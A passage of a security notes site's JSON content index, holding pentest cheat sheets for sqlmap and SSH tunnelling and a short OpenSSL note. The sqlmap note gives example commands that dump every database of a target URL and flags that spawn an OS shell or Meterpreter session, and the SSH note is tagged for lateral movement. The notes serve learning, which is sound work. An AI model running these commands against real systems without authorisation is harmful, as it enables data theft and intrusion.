&lt;em&gt;or&lt;/em&gt; you must specify POST parameters using &lt;code&gt;--data&lt;/code&gt;)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-p&lt;/code&gt; — which URL parameter(s) (variables) to test&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--dbms=DB_TYPE&lt;/code&gt; — only use injections for a given type of backend database (&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/MySQL&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/MySQL&quot;&gt;MySQL&lt;/a&gt;, PostgreSQL, etc.)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--dbs&lt;/code&gt; — enumerate DBs&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-D&lt;/code&gt;/&lt;code&gt;-T&lt;/code&gt;/&lt;code&gt;-C&lt;/code&gt; — dump a specific database/table/column&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--dump&lt;/code&gt;/&lt;code&gt;--dump-all&lt;/code&gt;/&lt;code&gt;--all&lt;/code&gt; — dump data&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--os-shell&lt;/code&gt; — attempt to spawn an interactive shell&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--os-pwn&lt;/code&gt; — attempt to spawn a Metasploit &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/meterpreter&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/meterpreter&quot;&gt;meterpreter&lt;/a&gt; shell or VNC session&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--forms&lt;/code&gt; — parse target URL for forms, and use these&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--batch&lt;/code&gt; — don’t prompt for user input, just use the defaults&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;--risk&lt;/code&gt; — set the maximum risk level of tests (1 – 3, lowest to highest risk)&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;For example:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sqlmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; http://example.com/test.php?input=foo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;       --dump-all&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Or:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sqlmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; http://example.com/test.php&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;       --data&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; input=foo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --dump-all&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;One handy way to seed a URL is using requests harvested with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Burp-Suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Burp-Suite&quot;&gt;Burp Suite&lt;/a&gt;.&lt;/p&gt;"},"spells/SSH":{"slug":"spells/SSH","filePath":"spells/SSH.md","title":"SSH","links":["spells/Kerberos","spells/Windows-services"],"tags":["Application/SSH","AttackCycle/LateralMovement","Protocol/SOCKS","OS/Windows","Protocol/Kerberos"],"content":"Port forwarding\nThe most important thing to remember about SSH port forwarding is that specifications are read as $FROM_SPEC:$TO_SPEC. So a local port forward creates a port that the local system uses to communicate with the remote host/port specified by $TO_SPEC, while a remote port forward creates a port that the remote system uses to communicate with the local host/port specified by $TO_SPEC. (It’s actually a little more complicated than this, as the $FROM_SPEC might be something like *:8888, which opens up port 8888 to all systems on the local subnet, not just localhost.\n\n\n                  \n                  Note\n                  \n                \n\n\nPort forwarding is always one-way, from the created port to the destination port.\n\n\n\nIt’s also possible to use SSH as a SOCKS5 proxy (with a tool like proxychains). As of OpenSSH 7.6, proxy ports can be opened up for both local and remote systems.\nLocal port forwarding\nForward $LOCAL_PORT from the local machine (-L), to $TARGET_HOST on $TARGET_PORT, relative to $REMOTE_HOST:\nssh -L $LOCAL_PORT:$TARGET_HOST$:$TARGET_PORT $REMOTE_USER@$REMOTE_HOST\n(Traffic flows from localhost:$LOCAL_PORT → $REMOTE_HOST → $TARGET_HOST:$TARGET_PORT.)\nDynamic port forwarding\nCreate a tunnel from the local machine using $LOCAL_PORT as the $REMOTE_HOST:\nssh -D $LOCAL_PORT $REMOTE_USER@$REMOTE_HOST\n(Traffic flows from localhost:$LOCAL_PORT → $REMOTE_HOST → the remote network, with $REMOTE_HOST acting as a SOCKS proxy for the local machine.)\nRemote port forwarding\nForward $REMOTE_PORT from $REMOTE_HOST (-R), to $TARGET_HOST on $TARGET_PORT, relative to the local machine:\nssh -R $REMOTE_PORT:$TARGET_HOST:$TARGET_PORT $REMOTE_USER@$REMOTE_HOST\n(Traffic flows from $REMOTE_HOST:$REMOTE_PORT → local machine → $TARGET_HOST:$TARGET_PORT.)\nReverse dynamic port forwarding\nCreate a tunnel from the $REMOTE_HOST using $REMOTE_PORT as the local machine:\nssh -R $REMOTE_PORT $REMOTE_USER@$REMOTE_HOST\n(Traffic flows from $REMOTE_HOST:$REMOTE_PORT → local machine → the local network, with the local machine acting as a SOCKS proxy for the $REMOTE_HOST.)\nChange a key’s passphrase\nssh-keygen -p -f $SSH_PRIVATE_KEY_FILE\nSSH on Windows\nOpenSSH has come bundled with Windows since Windows 10 1803.\nBy default, SSH on Windows uses the full Kerberos username, $DOMAIN\\$USER. This can often cause problems when interacting with non-Windows systems; the solution is to explicitly specify the username used in a given connection, either on the command line or in ~/.ssh/config.\nSSH-Agent on Windows\nThe ssh-agent daemon is available as a service on Windows, but is disabled by default.","richContent":"&lt;h2 id=&quot;port-forwarding&quot;&gt;Port forwarding&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#port-forwarding&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;The most important thing to remember about SSH port forwarding is that specifications are read as &lt;code&gt;$FROM_SPEC:$TO_SPEC&lt;/code&gt;. So a local port forward creates a port that the &lt;em&gt;local&lt;/em&gt; system uses to communicate with the &lt;em&gt;remote&lt;/em&gt; host/port specified by &lt;code&gt;$TO_SPEC&lt;/code&gt;, while a remote port forward creates a port that the &lt;em&gt;remote&lt;/em&gt; system uses to communicate with the &lt;em&gt;local&lt;/em&gt; host/port specified by &lt;code&gt;$TO_SPEC&lt;/code&gt;. (It’s actually a &lt;em&gt;little&lt;/em&gt; more complicated than this, as the &lt;code&gt;$FROM_SPEC&lt;/code&gt; might be something like &lt;code&gt;*:8888&lt;/code&gt;, which opens up port 8888 to &lt;em&gt;all&lt;/em&gt; systems on the local subnet, not just localhost.&lt;/p&gt;\n&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Port forwarding is always one-way, from the created port to the destination port.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;It’s also possible to use SSH as a SOCKS5 proxy (with a tool like proxychains). &lt;a href=&quot;https://superuser.com/questions/370930/ssh-reverse-socks-tunnel/1434747#1434747&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;As of OpenSSH 7.6, proxy ports can be opened up for both local &lt;em&gt;and&lt;/em&gt; remote systems.&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;h3 id=&quot;local-port-forwarding&quot;&gt;Local port forwarding&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#local-port-forwarding&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Forward &lt;code&gt;$LOCAL_PORT&lt;/code&gt; from the local machine (&lt;code&gt;-L&lt;/code&gt;), to &lt;code&gt;$TARGET_HOST&lt;/code&gt; on &lt;code&gt;$TARGET_PORT&lt;/code&gt;, relative to &lt;code&gt;$REMOTE_HOST&lt;/code&gt;:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ssh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -L&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $LOCAL_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$TARGET_HOST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$TARGET_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $REMOTE_USER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;@&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$REMOTE_HOST&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;(Traffic flows from &lt;code&gt;localhost:$LOCAL_PORT&lt;/code&gt; → &lt;code&gt;$REMOTE_HOST&lt;/code&gt; → &lt;code&gt;$TARGET_HOST:$TARGET_PORT&lt;/code&gt;.)&lt;/p&gt;\n&lt;h3 id=&quot;dynamic-port-forwarding&quot;&gt;Dynamic port forwarding&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#dynamic-port-forwarding&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Create a tunnel from the local machine using &lt;code&gt;$LOCAL_PORT&lt;/code&gt; as the &lt;code&gt;$REMOTE_HOST&lt;/code&gt;:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ssh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -D&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $LOCAL_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $REMOTE_USER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;@&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$REMOTE_HOST&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;(Traffic flows from &lt;code&gt;localhost:$LOCAL_PORT&lt;/code&gt; → &lt;code&gt;$REMOTE_HOST&lt;/code&gt; → the remote network, with &lt;code&gt;$REMOTE_HOST&lt;/code&gt; acting as a SOCKS proxy for the local machine.)&lt;/p&gt;\n&lt;h3 id=&quot;remote-port-forwarding&quot;&gt;Remote port forwarding&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#remote-port-forwarding&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Forward &lt;code&gt;$REMOTE_PORT&lt;/code&gt; from &lt;code&gt;$REMOTE_HOST&lt;/code&gt; (&lt;code&gt;-R&lt;/code&gt;), to &lt;code&gt;$TARGET_HOST&lt;/code&gt; on &lt;code&gt;$TARGET_PORT&lt;/code&gt;, &lt;em&gt;relative to the local machine&lt;/em&gt;:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ssh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -R&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $REMOTE_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$TARGET_HOST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$TARGET_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $REMOTE_USER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;@&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$REMOTE_HOST&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;(Traffic flows from &lt;code&gt;$REMOTE_HOST:$REMOTE_PORT&lt;/code&gt; → local machine → &lt;code&gt;$TARGET_HOST:$TARGET_PORT&lt;/code&gt;.)&lt;/p&gt;\n&lt;h3 id=&quot;reverse-dynamic-port-forwarding&quot;&gt;&lt;em&gt;Reverse&lt;/em&gt; dynamic port forwarding&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#reverse-dynamic-port-forwarding&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Create a tunnel from the &lt;code&gt;$REMOTE_HOST&lt;/code&gt; using &lt;code&gt;$REMOTE_PORT&lt;/code&gt; &lt;em&gt;as the local machine&lt;/em&gt;:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ssh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -R&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $REMOTE_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $REMOTE_USER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;@&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$REMOTE_HOST&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;(Traffic flows from &lt;code&gt;$REMOTE_HOST:$REMOTE_PORT&lt;/code&gt; → local machine → the local network, with the local machine acting as a SOCKS proxy for the &lt;code&gt;$REMOTE_HOST&lt;/code&gt;.)&lt;/p&gt;\n&lt;h2 id=&quot;change-a-keys-passphrase&quot;&gt;Change a key’s passphrase&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#change-a-keys-passphrase&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ssh-keygen&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $SSH_PRIVATE_KEY_FILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;ssh-on-windows&quot;&gt;SSH on Windows&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#ssh-on-windows&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;a href=&quot;https://www.openssh.com&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;OpenSSH&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; has come bundled with Windows since Windows 10 1803.&lt;/p&gt;\n&lt;p&gt;By default, SSH on Windows uses the full &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Kerberos&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Kerberos&quot;&gt;Kerberos&lt;/a&gt; username, &lt;code&gt;$DOMAIN\\$USER&lt;/code&gt;. This can often cause problems when interacting with non-Windows systems; the solution is to explicitly specify the username used in a given connection, either on the command line or in &lt;code&gt;~/.ssh/config&lt;/code&gt;.&lt;/p&gt;\n&lt;h3 id=&quot;ssh-agent-on-windows&quot;&gt;SSH-Agent on Windows&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#ssh-agent-on-windows&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;The &lt;code&gt;ssh-agent&lt;/code&gt; daemon is available as a &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Windows-services&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Windows-services&quot;&gt;service&lt;/a&gt; on Windows, but is disabled by default.&lt;/p&gt;"},"spells/Send-a-command-using-OpenSSL":{"slug":"spells/Send-a-command-using-OpenSSL","filePath":"spells/Send a command using OpenSSL.md","title":"Send a command using OpenSSL","links":[],"tags":["Application/OpenSSL","HowTo"],"content":"echo &quot;$TEXT&quot; | openssl s_client $HOST:$PORT -ign_eof\nThe -ign_eof keeps the s_client open on EOF, which can (does?) get sent after each command. This is necessary if you, say, want to read the connected server’s respond to sending it $TEXT.","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;echo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$TEXT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; openssl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; s_client&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $HOST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -ign_eof&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;The &lt;code&gt;-ign_eof&lt;/code&gt; keeps the s_client open on EOF, which can (does?) get sent after each command. This is necessary if you, say, want to read the connected server’s respond to sending it &lt;code&gt;$TEXT&lt;/code&gt;.&lt;/p&gt;"},"spells/Set-the-PATH-in-a-session-on-UNIX-like-operating-systems":{"slug":"spells/Set-the-PATH-in-a-session-on-UNIX-like-operating-systems","filePath":"spells/Set the PATH in a session on UNIX-like operating 